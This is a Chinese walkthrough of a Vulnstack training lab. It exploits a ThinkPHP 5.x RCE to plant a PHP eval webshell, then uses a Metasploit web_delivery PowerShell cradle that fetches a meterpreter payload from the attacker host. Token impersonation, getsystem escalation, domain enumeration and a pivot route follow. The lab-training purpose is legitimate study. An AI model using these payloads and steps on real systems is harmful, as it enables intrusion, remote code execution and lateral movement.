



> 渗透过程： https://mp.weixin.qq.com/s/RViKCbpYqBYYDofpHLTCKA
>
> 虚拟机下载，虚拟机密码：http://vulnstack.qiyuanxuetang.net/vuln/detail/7/



# 配置虚拟机

- 内网主机：windows2008 192.168.138.138
- 连接内网主机和外网的主机：win7: 双网卡，连接内网主机的ip: 192.168.138.136；连接外网的ip: 192.168.102.101

配置完后win7可以ping windows2008，但由于win7防火墙问题，windows2008无法ping win7



# 外网渗透

用与win7处于同一网段的kali虚拟机

- 发现Web服务和Mysql

```bash
nmap -T4 -sC -sV 192.168.102.101

```

- 浏览器中访问 http://192.168.102.101 ，发现是thinkphp

```bash
http://192.168.102.101/?s=1  # 查看thinkphp详细版本 # 1 可以换成 2, 3... 0代表主页
searchsploit thinkphp # kali上运行，查看漏洞利用POC # 发现最后一个是thinkphp5.X版本的RCE
cd /usr/share/exploitdb/exploits/php/webapps 
cat 46150.txt # 进入该漏洞的文件46150.txt
http://192.168.102.101/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami # payload：可以看到返回值为sun\Administrator
http://192.168.102.101/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php @eval($_POST[whoami]);?>" > shell.php # 写入Webshell：将增加一个网页，名为shell.php
echo "<?php @eval($_POST[whoami]);?>" > shell.php # 作用是把一句话木马写入 shell.php
```

```bash
# 查看是否执行成功
http://192.168.102.101/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
# 网页中显示内容：可以看到有shell.php 并有日期信息
������ C �еľ�û�б�ǩ�� �������к��� 56A6-E413 C:\phpStudy\PHPTutorial\WWW\public ��Ŀ¼ 2021/04/19 16:48
. 2021/04/19 16:48
.. 2018/09/07 16:09 216 .htaccess 2020/01/19 11:39 125,933 add.php 2018/09/07 16:09 1,150 favicon.ico 2018/09/07 16:09 766 index.php 2018/09/07 16:09 24 robots.txt 2018/09/07 16:09 840 router.php 2021/04/19 16:48 35 shell.php 2020/03/05 00:48
static 7 ���ļ� 128,964 �ֽ� 3 ��Ŀ¼ 47,961,751,552 �����ֽ� 3 ��Ŀ¼ 47,961,751,552 �����ֽ�
```

- 下载安装蚁剑 AntSword
- 在主界面右键，添加数据，url填写：http://192.168.102.101/shell.php 连接密码填 whoami







# 攻入内网

- 

```bash
ipconfig /all   # 查看本机ip，所在域
route print     # 打印路由信息
net view        # 查看局域网内其他主机名
arp -a          # 查看arp缓存
whoami          # 查看当前用户
net start       # 查看开启了哪些服务
net share       # 查看开启了哪些共享

net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators   # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group "domain admins" /domain  # 查看域管理员的名字
net group "domain computers" /domain  # 查看域中的其他主机名
net group "domain controllers" /domain  # 查看域控制器（可能有多台）
```



```bash
> ipconfig
Windows IP 配置
以太网适配器 本地连接:
   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::103d:71c3:dd34:cf51%16
   IPv4 地址 . . . . . . . . . . . . : 192.168.138.136 # 存在138网段
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 
以太网适配器 Bluetooth 网络连接:
   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
以太网适配器 wk1 waiwang:
   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::919a:a723:2500:e5a6%11
   IPv4 地址 . . . . . . . . . . . . : 192.168.102.101
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.102.2
隧道适配器 isatap.{AD846195-B498-494E-9D15-14D3C49095BC}:
   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
隧道适配器 isatap.{4660F312-0A34-48C8-B979-938D6645032D}:
   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
隧道适配器 isatap.{522E987F-D8BB-4F8D-BD80-6B57C75E348D}:
   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
> net config workstation
计算机名                     \\WIN7
计算机全名                   win7.sun.com
用户名                       Administrator
工作站正运行于               
    NetBT_Tcpip_{4660F312-0A34-48C8-B979-938D6645032D} (000C29E3CA15)
    NetBT_Tcpip_{522E987F-D8BB-4F8D-BD80-6B57C75E348D} (000C29E3CA1F)
软件版本                     Windows 7 Professional
工作站域                     SUN  # 可以发现存在一个SUN域
工作站域 DNS 名称            sun.com
登录域                       SUN
COM 打开超时 (秒)            0
COM 发送计数 (字节)          16
COM 发送超时 (毫秒)          250
命令成功完成。
> net user /domain  # 当前获得的用户权限却不能收集域信息
这项请求将在域 sun.com 的域控制器处理。
发生系统错误 5。
拒绝访问
> whoami
sun\administrator
```

当前用户直接就是administrator管理员账户。目标主机所在的网络环境还存在一个192.168.138.0的网段，并且存在一个名为“sun”的域环境。但是当前获得的用户权限却不能收集域信息，所以得给这台主机（Windows 7）上一个meterpreter并伪造一个权限较低的用户的令牌然后再来尝试收集域信息。

这里使用metasploit的web_delivery模块：



```bash
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost 192.168.102.128
lhost => 192.168.102.128
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 192.168.102.128:4444 
[*] Using URL: http://0.0.0.0:8080/gZdViy4n2rGsr3z
[*] Local IP: http://192.168.102.128:8080/gZdViy4n2rGsr3z
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABoAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGgALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABoAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAyAC4AMQAyADgAOgA4ADAAOAAwAC8AZwBaAGQAVgBpAHkANABuADIAcgBHAHMAcgAzAHoALwBJAFkAWgA0AGQAagBGAFMATwBVAGUAQwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAyAC4AMQAyADgAOgA4ADAAOAAwAC8AZwBaAGQAVgBpAHkANABuADIAcgBHAHMAcgAzAHoAJwApACkAOwA=
```

- 复制上面这段`powershell.exe`开头的payload，到蚁剑的目标机(win7)虚拟终端上执行，然后会看到出现输出：

```bash
[*] 192.168.102.101  web_delivery - Delivering AMSI Bypass (939 bytes)
[*] 192.168.102.101  web_delivery - Delivering Payload (1892 bytes)
[*] Sending stage (175174 bytes) to 192.168.102.101
[*] Meterpreter session 1 opened (192.168.102.128:4444 -> 192.168.102.101:50316) at 2021-04-20 03:10:43 -0400
msf6 exploit(multi/script/web_delivery) > sessions # 查看打开了的sessions
Active sessions
===============
  Id Name Type                    Information              Connection
  -- ---- ----                    -----------              ----------
  1       meterpreter x86/windows SUN\Administrator @ WIN7 192.168.102.128:4444 -> 192.168.102.101:50316 (192.168.102.101)
msf6 exploit(multi/script/web_delivery) > sessions -i 1 # 选择session 1 交互
[*] Starting interaction with 1...

meterpreter > getuid # 查看当前token
Server username: SUN\Administrator
meterpreter > use incognito # 加载incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u # 列出AccessToken
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SUN\Administrator
SUN\leo

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token "SUN\leo" # 模拟DEMO\douser用户
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user SUN\leo
meterpreter > getuid # 查看当前token
Server username: SUN\leo # 确实切换到了 SUN\leo 用户上
meterpreter > rev2self # 返回到之前的AccessToken权限
meterpreter >
```

- 即便模拟了SUN\leo用户的令牌也无法执行域内命令。后来 `getsystem` 提升了权限（删除了部分输出）：

```bash
meterpreter > getsystem # 提升权限
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid # 查看当前token
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell # 
Process 3996 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>chcp 65001  # 解决 msf 连接 win7 shell 的乱码问题

C:\Windows\system32>net user /domain
net user /domain
The request will be processed at a domain controller for domain sun.com.
User accounts for \\DC.sun.com
-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
krbtgt                   leo                      
The command completed with one or more errors.

C:\Windows\system32>net group "domain computers" /domain # 查看域内主机
net group "domain computers" /domain
The request will be processed at a domain controller for domain sun.com.
Group name     Domain Computers
Comment        ���뵽���е����й���վ�ͷ�����
Members
-------------------------------------------------------------------------------
WIN7$                    # 注意这里的 WIN7 为域内主机
The command completed successfully.


C:\Windows\system32>net group "domain controllers" /domain # 查看域控制器
net group "domain controllers" /domain
The request will be processed at a domain controller for domain sun.com.
Group name     Domain Controllers
Comment        ����������������
Members
-------------------------------------------------------------------------------
DC$                      # 注意这里的 DC 为域控制器


C:\Windows\system32>net group "domain admins" /domain # 查看域管理员
net group "domain admins" /domain
The request will be processed at a domain controller for domain sun.com.
Group name     Domain Admins
Comment        ����������Ա
Members
-------------------------------------------------------------------------------
Administrator            # 注意这里域管理员为 Administrator
The command completed successfully.
```

- 可知域控制器为`DC$`，域管理员为Administrator
- ping一下`DC$`, `ping DC.sun.com`,得到域控的IP为192.168.138.138



# 横向移动

- 在`msf6 exploit(multi/script/web_delivery) >`上执行

```bash
# route add 192.168.138.0 255.255.255.0 1 # 1 代表 session 1

msf6 exploit(multi/script/web_delivery) > route add 192.168.138.0 255.255.255.0 1
[*] Route added
msf6 exploit(multi/script/web_delivery) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.138.0      255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
```





